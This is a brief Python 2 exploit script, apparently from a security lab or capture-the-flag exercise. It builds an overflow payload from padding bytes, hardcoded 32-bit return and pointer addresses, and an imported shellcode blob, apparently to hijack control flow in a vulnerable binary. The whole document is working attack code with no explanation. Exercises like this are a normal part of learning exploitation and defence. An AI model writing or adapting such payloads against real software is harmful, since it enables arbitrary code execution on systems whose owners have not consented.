from shellcode import shellcode
from struct import pack
print 'A'*40+pack('<I',0x080f3750)+pack('<I',0xbffea7dc)+" "+shellcode+'A'*17+pack('<I',0xbffea7dc)+pack('<I',0x080f3748)+" A"
